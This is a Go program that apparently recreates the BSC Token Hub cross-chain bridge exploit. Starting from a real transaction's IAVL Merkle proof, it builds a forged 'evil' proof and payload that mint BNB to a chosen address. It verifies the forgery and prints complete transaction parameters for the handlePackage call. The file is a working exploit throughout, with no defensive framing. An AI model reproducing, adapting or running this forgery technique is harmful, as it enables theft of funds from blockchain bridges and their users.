package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/tendermint/iavl"
	"github.com/tendermint/tendermint/crypto/merkle"
	"github.com/tendermint/tendermint/crypto/tmhash"
)

func mustDecode(str string) []byte {
	if strings.HasPrefix(str, "0x") {
		str = str[2:]
	}
	b, err := hex.DecodeString(str)
	if err != nil {
		panic(err)
	}
	return b
}

func getValueOp(legitProofBytes []byte) iavl.IAVLValueOp {
	var legitProof merkle.Proof
	if err := legitProof.Unmarshal(legitProofBytes); err != nil {
		panic(err)
	}

	legitValueOpIntf, err := iavl.IAVLValueOpDecoder(legitProof.Ops[0])
	if err != nil {
		panic(err)
	}

	return legitValueOpIntf.(iavl.IAVLValueOp)
}

func main() {
	//params
	//addressToMint := "0x489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec" //original exploiter
	addressToMint := "0x489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec"
	var packageSequence uint64 = 17684867

	//utils
	//proof from https://bscscan.com/tx/0xf2c714b6b006fc9c633d5d95ddec05a76402f9607e114fcece30656f25047dc9
	originalProof := "0x0a8d020a066961766c3a76120e00000100380200000000010dd9831af201f0010aed010a2b0802100318b091c73422200c10f902d266c238a4ca9e26fa9bc36483cd3ebee4e263012f5e7f40c22ee4d20a4d0801100218b091c7342220e4fd47bffd1c06e67edad92b2bf9ca63631978676288a2aa99f95c459436ef632a200ea04a867b36107e32a07707689376cb2048227b2c6393cddb473ab6d2c5e73112001a370a0e0000010038020000000000000002122011056c6919f02d966991c10721684a8d1542e44003f9ffb47032c18995d4ac7f18b091c7341a340a0e00000100380200000000010dd98312202c3a561458f8527b002b5ec3cab2d308662798d6245d4588a4e6a80ebdfe30ac18010ad4050a0a6d756c746973746f726512036962631ac005be050abb050a110a066f7261636c6512070a0508b891c7340a0f0a046d61696e12070a0508b891c7340a350a08736c617368696e6712290a2708b891c7341220c8ccf341e6e695e7e1cb0ce4bf347eea0cc16947d8b4e934ec400b57c59d6f860a380a0b61746f6d69635f7377617012290a2708b891c734122042d4ecc9468f71a70288a95d46564bfcaf2c9f811051dcc5593dbef152976b010a110a0662726964676512070a0508b891c7340a300a0364657812290a2708b891c73412201773be443c27f61075cecdc050ce22eb4990c54679089e90afdc4e0e88182a230a2f0a02736312290a2708b891c7341220df7a0484b7244f76861b1642cfb7a61d923794bd2e076c8dbd05fc4ee29f3a670a330a06746f6b656e7312290a2708b891c734122064958c2f76fec1fa5d1828296e51264c259fa264f499724795a740f48fc4731b0a320a057374616b6512290a2708b891c734122015d2c302143bdf029d58fe381cc3b54cedf77ecb8834dfc5dc3e1555d68f19ab0a330a06706172616d7312290a2708b891c734122050abddcb7c115123a5a4247613ab39e6ba935a3d4f4b9123c4fedfa0895c040a0a300a0361636312290a2708b891c734122079fb5aecc4a9b87e56231103affa5e515a1bdf3d0366490a73e087980b7f1f260a0e0a0376616c12070a0508b891c7340a300a0369626312290a2708b891c7341220e09159530585455058cf1785f411ea44230f39334e6e0f6a3c54dbf069df2b620a300a03676f7612290a2708b891c7341220db85ddd37470983b14186e975a175dfb0bf301b43de685ced0aef18d28b4e0420a320a05706169727312290a2708b891c7341220a78b556bc9e73d86b4c63ceaf146db71b12ac80e4c10dd0ce6eb09c99b0c7cfe0a360a0974696d655f6c6f636b12290a2708b891c73412204775dbe01d41cab018c21ba5c2af94720e4d7119baf693670e70a40ba2a52143"
	baseEvilPayload := "0x000000000000000000000000000000000000000000000000000000000000000000f870a0424e4200000000000000000000000000000000000000000000000000000000009400000000000000000000000000000000000000008ad3c21bcecceda100000094%v94%v846553f100"
	baseEvilProof := "0x0a8d020a066961766c3a76120e000001003802%v1af201f0010aed010a2b0802100318b091c73422200c10f902d266c238a4ca9e26fa9bc36483cd3ebee4e263012f5e7f40c22ee4d20a4d0801100218b091c7342220e4fd47bffd1c06e67edad92b2bf9ca63631978676288a2aa99f95c459436ef632a20%v12001a370a0e0000010038020000000000000002122011056c6919f02d966991c10721684a8d1542e44003f9ffb47032c18995d4ac7f18b091c7341a340a0e000001003802%v1220%v18010ad4050a0a6d756c746973746f726512036962631ac005be050abb050a110a066f7261636c6512070a0508b891c7340a0f0a046d61696e12070a0508b891c7340a350a08736c617368696e6712290a2708b891c7341220c8ccf341e6e695e7e1cb0ce4bf347eea0cc16947d8b4e934ec400b57c59d6f860a380a0b61746f6d69635f7377617012290a2708b891c734122042d4ecc9468f71a70288a95d46564bfcaf2c9f811051dcc5593dbef152976b010a110a0662726964676512070a0508b891c7340a300a0364657812290a2708b891c73412201773be443c27f61075cecdc050ce22eb4990c54679089e90afdc4e0e88182a230a2f0a02736312290a2708b891c7341220df7a0484b7244f76861b1642cfb7a61d923794bd2e076c8dbd05fc4ee29f3a670a330a06746f6b656e7312290a2708b891c734122064958c2f76fec1fa5d1828296e51264c259fa264f499724795a740f48fc4731b0a320a057374616b6512290a2708b891c734122015d2c302143bdf029d58fe381cc3b54cedf77ecb8834dfc5dc3e1555d68f19ab0a330a06706172616d7312290a2708b891c734122050abddcb7c115123a5a4247613ab39e6ba935a3d4f4b9123c4fedfa0895c040a0a300a0361636312290a2708b891c734122079fb5aecc4a9b87e56231103affa5e515a1bdf3d0366490a73e087980b7f1f260a0e0a0376616c12070a0508b891c7340a300a0369626312290a2708b891c7341220e09159530585455058cf1785f411ea44230f39334e6e0f6a3c54dbf069df2b620a300a03676f7612290a2708b891c7341220db85ddd37470983b14186e975a175dfb0bf301b43de685ced0aef18d28b4e0420a320a05706169727312290a2708b891c7341220a78b556bc9e73d86b4c63ceaf146db71b12ac80e4c10dd0ce6eb09c99b0c7cfe0a360a0974696d655f6c6f636b12290a2708b891c73412204775dbe01d41cab018c21ba5c2af94720e4d7119baf693670e70a40ba2a52143"

	//logic
	//1. build payload and valuehash for the tree
	evilPayload := fmt.Sprintf(baseEvilPayload, addressToMint[2:], addressToMint[2:])
	evilPayloadBytes := mustDecode(evilPayload)
	evilPayloadHash := tmhash.Sum(evilPayloadBytes)

	//2. create leaf hash to replace in proof
	evilPayloadOp := getValueOp(mustDecode(originalProof))
	evilLeafNode := evilPayloadOp.Proof.Leaves[1]
	evilLeafNode.Key = append([]byte(nil), []byte(evilPayloadOp.GetKey())...)
	evilLeafNode.Key = evilLeafNode.Key[:6]
	//2.1 replace packageSequence field
	packageSequenceBytes := make([]byte, 8)
	binary.BigEndian.PutUint64(packageSequenceBytes, packageSequence)
	evilLeafNode.Key = append(evilLeafNode.Key, packageSequenceBytes...)
	evilLeafNode.ValueHash = evilPayloadHash
	newLeafHash := evilLeafNode.Hash()

	//3. generate evilproof
	evilProof := fmt.Sprintf(baseEvilProof, fmt.Sprintf("%x", packageSequenceBytes), fmt.Sprintf("%x", newLeafHash), fmt.Sprintf("%x", packageSequenceBytes), fmt.Sprintf("%x", evilPayloadHash))

	//4. double check it's valid
	evilProofAgain := getValueOp(mustDecode(evilProof))
	rootHash := evilProofAgain.Proof.ComputeRootHash()

	fmt.Printf("packageSequence %x\n", packageSequenceBytes)
	fmt.Printf("payloadHash     %x\n", evilPayloadHash)
	fmt.Printf("newLeafHash     %x\n", newLeafHash)
	fmt.Printf("rootHash        %x\n", rootHash)

	verifyErr := evilProofAgain.Proof.Verify(rootHash)
	fmt.Printf("error computing root hash? %v\n", verifyErr)

	verifyErr = evilProofAgain.Proof.VerifyItem(evilProofAgain.Proof.Leaves[1].Key, evilPayloadBytes)
	fmt.Printf("error verifying proof? %v\n", verifyErr)

	//transaction parameters
	fmt.Printf(`
TRANSACTION PARAMETERS

contract: 0x0000000000000000000000000000000000002000
function: handlePackage(bytes payload, bytes proof, uint64 height, uint64 packageSequence, uint8 channelId)
payload: %v
proof: %v
height: 110217401
packageSequence: %v
channelId: 2
`, evilPayload, evilProof, packageSequence)

}
